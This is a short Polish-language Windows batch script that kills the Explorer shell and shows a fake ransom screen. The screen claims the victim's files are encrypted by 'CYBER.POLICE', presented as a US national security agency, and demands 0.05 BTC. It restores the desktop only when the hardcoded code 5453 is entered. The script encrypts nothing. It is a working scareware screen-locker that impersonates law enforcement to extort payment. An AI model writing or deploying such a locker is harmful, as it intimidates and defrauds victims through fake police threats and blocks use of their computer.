@echo off
taskkill /f /im explorer.exe
cls
echo Twoje wazne pliki som zaszyfrowane
echo CYBER.POLICE Amerykanska agencja bezpieczenstwa narodowego
echo Pozostaly czas:                 1-6-51-52
echo Adres Bitcoina:                 Desctyptor-100$5643.btc
echo Jak dokonac platnosci? Wyslij 0.05 BTC pod adres Descryptor1-100$5643.btc
echo                                                        0.04 - 400 zl - 40 dolars
echo Po dokonaniu platnosci skontaktuj sie z nami, aby uzyskac odszyfrowanie
echo E-mail:crypt767[beden]
set code=""

:code
set /p code="Wpisuj kod tutaj:"
if "%code%"=="5453" goto correct
if NOT "%code%"=="5453" goto wrong

:correct
start explorer
echo kod jest bardzo dobry!
pause
exit

:wrong
echo Kod jest zly:(!
goto code
